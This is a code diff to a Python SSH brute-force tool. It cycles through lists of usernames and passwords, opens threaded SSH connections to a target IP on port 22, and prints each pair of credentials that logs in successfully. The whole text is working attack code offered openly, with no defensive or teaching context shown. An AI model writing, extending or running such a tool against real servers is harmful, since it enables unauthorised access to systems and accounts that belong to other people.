@@ -57,11 +57,30 @@ class SSHBruteForce():
         for userName in self.userNames:
             for password in self.passwords:
                 self.createConnection(userName, password, self.targetIp)
-                
+            if self.currentThreadCount == self.amountOfThreads:
+                self.currentThreadResults()
+            
     def createConnection(self, userName, password, targetIp):
         connection = Connection(userName, password, targetIp, 22, 30)
         connection.start()
-        self.results.append(connection)
+        self.connections.append(connection)
         self.currentThreadCount += 1
+        
+    def currentThreadResults(self):
+        for connection in self.connections:
+            connection.join()
+            if connection.status == 'Succeeded':
+                print "[#] TargetIp: %s " % connection.targetIp
+                print "[#] Username: %s " % connection.userName
+                print "[#] Password: %s " % connection.password
+            else:
+                pass
+    
+        self.clearOldThreads()
+        
+    def clearOldThreads(self):
+        self.connections = []
+        self.threadCount = 0
+                
     
     
